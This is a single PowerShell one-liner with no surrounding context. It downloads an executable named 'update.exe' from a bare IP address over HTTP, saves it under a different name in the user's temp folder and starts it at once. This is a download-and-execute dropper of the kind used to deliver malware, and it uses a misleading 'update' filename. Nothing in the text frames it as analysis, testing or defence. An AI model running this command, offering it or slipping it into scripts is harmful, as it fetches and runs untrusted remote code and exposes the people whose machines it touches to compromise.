
(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.28/update.exe',"$env:TEMP\file2x86.exe");Start-Process ("$env:TEMP\file2x86.exe")

